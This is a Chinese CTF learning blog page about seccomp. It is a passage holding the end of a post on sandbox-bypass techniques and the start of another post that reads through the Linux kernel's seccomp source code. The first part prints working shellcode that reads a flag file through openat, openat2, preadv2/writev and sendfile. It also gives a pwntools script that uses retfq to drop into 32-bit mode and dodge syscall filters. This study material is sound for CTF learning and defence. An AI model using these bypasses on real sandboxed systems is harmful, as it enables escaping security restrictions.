<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_38090681/article/details/103056884">资料</a>，函数的第一个参数<code>dfd</code>指的是当<code>path</code>为相对路径时，该路径在文件系统中的开始地址（即打开目录获取的文件描述符），但可以指定其为<code>AT_FDCWD</code>(-100)，指定路径为当前路径。另外3个参数与<code>open</code>参数相同。<code>openat</code>的返回值与<code>open</code>相同，都是当前正未使用的最小的文件描述符值。</p>
<p>示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">xor rdi, rdi</span><br><span class="line">sub rdi, 100</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor r10, r10</span><br><span class="line">push SYS_openat</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 3</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp-8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov rdx, 1</span><br><span class="line">xor r10, r10</span><br><span class="line">xor r8, r8</span><br><span class="line">push SYS_preadv2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp+8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_writev</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h2 id="b-openat2-nr437"><a class="markdownIt-Anchor" href="#b-openat2-nr437"></a> B. openat2 (nr=437)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">openat2</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span>* filename, <span class="keyword">struct</span> open_how* how, <span class="type">size_t</span> usize)</span>;</span><br></pre></td></tr></table></figure>
<p>这个函数封装了三个参数到结构体<code>how</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_how</span> &#123;</span></span><br><span class="line">	__u64 flags;</span><br><span class="line">	__u64 mode;</span><br><span class="line">	__u64 resolve;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>dfd</code>与另外3个参数的使用方式与<code>openat</code>相同，<code>resolve</code>指解析路径名所有组件的方式，普通的打开文件操作填0即可。参数<code>size</code>必须为结构体<code>open_how</code>的大小，也就是<code>0x18</code>。</p>
<p>实例代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0x67616c662f2e</span></span><br><span class="line">push rax</span><br><span class="line">xor rdi, rdi</span><br><span class="line">sub rdi, <span class="number">100</span></span><br><span class="line">mov rsi, rsp</span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">mov rdx, rsp</span><br><span class="line">mov r10, <span class="number">0x18</span></span><br><span class="line">push SYS_openat2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h1 id="0x05-execve-open-openat-openat2"><a class="markdownIt-Anchor" href="#0x05-execve-open-openat-openat2"></a> 0x05. execve + open + openat + openat2</h1>
<p>如果题目禁用了x64的所有3个打开文件的系统调用，此时还有一种情况使得我们可以成功打开文件并获取文件描述符：当seccomp没有禁用x64的fstat系统调用时，可以通过将程序暂时转换为32位模式再通过<code>open</code>系统调用打开文件，因为32位的<code>open</code>系统调用与64位的不同，32位<code>open</code>的系统调用号为5，对应x64的系统调用表中为<code>fstat</code>系统调用。</p>
<p><code>retfq</code>指令，在x86-64中可用于将程序从64位长模式转换为32位模式，在转换时需要注意修改栈地址为32位地址，并向栈中保存一些特定值，在64位系统中，<code>cs</code>寄存器的值为0x23时表示当前程序处于32位状态，值为0x33时表示当前程序处于64位状态。在执行<code>retfq</code>指令之前，我们就应该修改<code>rsp</code>，并将0x23和要执行的32位指令地址push进栈。在执行<code>retfq</code>后，程序将自动转到32位环境中工作。在32位代码执行结束后，如果需要返回到64位状态，可通过<code>jmp 0x33:xxxxx ; ret</code>的指令返回到64位代码。</p>
<p>注意：如果在执行<code>retfq</code>时<code>rsp</code>高位的任何值都会被直接舍弃，只取低32位作为新的栈地址，而这个地址通常是不能预先获取的，因此<code>retfq</code>前重新赋值<code>rsp</code>很有必要。</p>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_64_1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, 0x10000</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov r10, 0x21</span></span><br><span class="line"><span class="string">    mov r8, 0xFFFFFFFF</span></span><br><span class="line"><span class="string">    xor r9, r9</span></span><br><span class="line"><span class="string">    push SYS_mmap</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    mov rcx, 0x200</span></span><br><span class="line"><span class="string">    mov rdi, 0x10000</span></span><br><span class="line"><span class="string">    mov rsi, 0x600000000100</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rsp, 0x10800</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x10000</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_32 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	mov eax, 0x6761</span></span><br><span class="line"><span class="string">	push eax</span></span><br><span class="line"><span class="string">	mov eax, 0x6c662f2e</span></span><br><span class="line"><span class="string">	push eax</span></span><br><span class="line"><span class="string">	mov ebx, esp</span></span><br><span class="line"><span class="string">	xor ecx, ecx</span></span><br><span class="line"><span class="string">	xor edx, edx</span></span><br><span class="line"><span class="string">	mov eax, 5</span></span><br><span class="line"><span class="string">	int 0x80</span></span><br><span class="line"><span class="string">	jmp 0x33:0x10100</span></span><br><span class="line"><span class="string">	ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_64_2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, 3</span></span><br><span class="line"><span class="string">    push 0x100</span></span><br><span class="line"><span class="string">    lea rbx, [rsp-8]</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    push SYS_preadv2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x1</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push 0x100</span></span><br><span class="line"><span class="string">    lea rbx, [rsp+8]</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_writev</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">payload = asm(shellcode_64_1).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += asm(shellcode_32, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += asm(shellcode_64_2)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>需要注意的是32位的系统调用使用的是<code>int 0x80</code>指令触发，且传参使用的寄存器也有所不同（<code>rbx</code>、<code>rcx</code>、<code>rdx</code>、<code>rsi</code>、<code>rdi</code>）。既然转到32位可以绕过基于系统调用号的检查，那么自然而然地，我们也可以进行扩展，如果禁用了64位的所有<code>read</code>与<code>write</code>，或许也可以通过使用32位的<code>read</code>和<code>write</code>相关系统调用完成读写操作。这一部分就交给读者自行探索。</p>
<h1 id="0x06-其他"><a class="markdownIt-Anchor" href="#0x06-其他"></a> 0x06. 其他</h1>
<p>如果题目禁用了所有与<code>read</code>和<code>write</code>相关，也就是上面提到的与读写相关的所有系统调用，我们又应该如何应对呢？实际上seccomp的绕过姿势有很多，这里介绍一下sendfile，至于其他的技巧将在下一篇文章中介绍。</p>
<h2 id="a-sendfile-nr40"><a class="markdownIt-Anchor" href="#a-sendfile-nr40"></a> A. sendfile (nr=40)</h2>
<p>这是一个很好用的系统调用，它允许将文件数据从一个文件描述符直接发送到另一个文件描述符，而且不需要经过缓冲区拷贝，被称为“零拷贝技术”，这一技术也被应用于<code>mmap</code>等系统调用中。可以说这个系统调用用起来比<code>read</code>+<code>write</code>还要简单。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span>* offset, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 1</span><br><span class="line">mov rsi, 3</span><br><span class="line">push 0</span><br><span class="line">mov rdx, rsp</span><br><span class="line">mov r10, 0x100</span><br><span class="line">push SYS_sendfile</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/29/seccomp%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/29/seccomp%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">seccomp学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-29 15:20:25" itemprop="dateCreated datePublished" datetime="2023-10-29T15:20:25+08:00">2023-10-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-31 11:43:34" itemprop="dateModified" datetime="2023-10-31T11:43:34+08:00">2023-10-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/seccomp-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">seccomp 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天打了ACTF-2023，惊呼已经不认识seccomp了，在被一道盲打题折磨了一整天之后，实在是不想面向题目高强度学习了。但是seccomp这个东西必然是要系统性的重学一遍了，绝不能把知识面仅限于orw。</p>
<p>学习目标：了解seccomp的保护原理，掌握常用的seccomp绕过姿势，学会手写seccomp BPF指令等。</p>
<h1 id="0x01-seccomp规则添加原理"><a class="markdownIt-Anchor" href="#0x01-seccomp规则添加原理"></a> 0x01. seccomp规则添加原理</h1>
<p>说到seccomp，都知道它是用来限制进程的系统调用的，但是对于Linux系统而言，有这么多的进程，seccomp又是如何精准拦截定义了规则的进程中调用的非法的系统调用呢？</p>
<p>这就又不得不进入一个令人不适的环节了——Linux源代码阅读。</p>
<p>在目前使用的Linux系统中，有两个系统调用与seccomp有关，一个是<code>prctl</code>，另一个是<code>seccomp</code>，系统调用号分别为157和317，对应的内核函数为<code>sys_prctl</code>和<code>sys_seccomp</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(seccomp, <span class="type">unsigned</span> <span class="type">int</span>, op, <span class="type">unsigned</span> <span class="type">int</span>, flags,</span><br><span class="line">			 <span class="type">void</span> __user *, uargs)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_seccomp(op, flags, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="type">int</span>, option, <span class="type">unsigned</span> <span class="type">long</span>, arg2, <span class="type">unsigned</span> <span class="type">long</span>, arg3,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span>, arg4, <span class="type">unsigned</span> <span class="type">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> PR_GET_SECCOMP:</span><br><span class="line">            error = prctl_get_seccomp();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PR_SET_SECCOMP:</span><br><span class="line">            error = prctl_set_seccomp(arg2, (<span class="type">char</span> __user *)arg3);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">prctl_set_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> seccomp_mode, <span class="type">void</span> __user *filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line">	<span class="type">void</span> __user *uargs;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (seccomp_mode) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">		op = SECCOMP_SET_MODE_STRICT;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Setting strict mode through prctl always ignored filter,</span></span><br><span class="line"><span class="comment">		 * so make sure it is always NULL here to pass the internal</span></span><br><span class="line"><span class="comment">		 * check in do_seccomp().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		uargs = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">		op = SECCOMP_SET_MODE_FILTER;</span><br><span class="line">		uargs = filter;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* prctl interface doesn&#x27;t have flags, so they are always zero. */</span></span><br><span class="line">	<span class="keyword">return</span> do_seccomp(op, <span class="number">0</span>, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，如果将<code>prctl</code>系统调用的第一个参数设置为<code>PR_SET_SECCOMP</code>，最终调用的与<code>sys_seccomp</code>相同，都是<code>do_seccomp</code>。这也是设置<code>seccomp</code>规则的入口函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Common entry point for both prctl and syscall. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> op, <span class="type">unsigned</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">		       <span class="type">void</span> __user *uargs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> (op) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_SET_MODE_STRICT:</span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span> || uargs != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">return</span> seccomp_set_mode_strict();</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_SET_MODE_FILTER:</span><br><span class="line">		<span class="keyword">return</span> seccomp_set_mode_filter(flags, uargs);</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_GET_ACTION_AVAIL:</span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> seccomp_get_action_avail(uargs);</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_GET_NOTIF_SIZES:</span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> seccomp_get_notif_sizes(uargs);</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就是<code>do_seccomp</code>函数的定义。我们要重点关注的是前面两个switch分支，一个是<code>SECCOMP_SET_MODE_STRICT</code></p>
<h2 id="a-默认规则"><a class="markdownIt-Anchor" href="#a-默认规则"></a> A. 默认规则</h2>
<p>添加默认规则的逻辑在<code>seccomp_set_mode_strict</code>中实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">seccomp_set_mode_strict</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> seccomp_mode = SECCOMP_MODE_STRICT;</span><br><span class="line">	<span class="type">long</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">	spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!seccomp_may_assign_mode(seccomp_mode))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TIF_NOTSC</span></span><br><span class="line">	disable_TSC();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	seccomp_assign_mode(current, seccomp_mode, <span class="number">0</span>);</span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">seccomp_may_assign_mode</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> seccomp_mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert_spin_locked(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (current-&gt;seccomp.mode &amp;&amp; current-&gt;seccomp.mode != seccomp_mode)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_STRICT 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_FILTER 1</span></span><br></pre></td></tr></table></figure>
<p>函数中的<code>current</code>是一个<code>task_struct</code>实例，表示当前内核进程。在加锁之后，调用了一个<code>seccomp_may_assign_mode</code>函数用于判断。从这个判断函数可以发现，当我们使用BPF定义规则（此时mode为<code>SECCOMP_MODE_FILTER</code>）时，就不能再切换成严格模式了，否则该函数返回<code>false</code>，直接跳过了规则修改流程。</p>
<p>随后进入主要的规则添加逻辑<code>seccomp_assign_mode</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">seccomp_assign_mode</span><span class="params">(<span class="keyword">struct</span> task_struct *task,</span></span><br><span class="line"><span class="params">				       <span class="type">unsigned</span> <span class="type">long</span> seccomp_mode,</span></span><br><span class="line"><span class="params">				       <span class="type">unsigned</span> <span class="type">long</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert_spin_locked(&amp;task-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	task-&gt;seccomp.mode = seccomp_mode;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Make sure SYSCALL_WORK_SECCOMP cannot be set before the mode (and</span></span><br><span class="line"><span class="comment">	 * filter) is set.</span></span><br><span class="line"><span class="comment">	 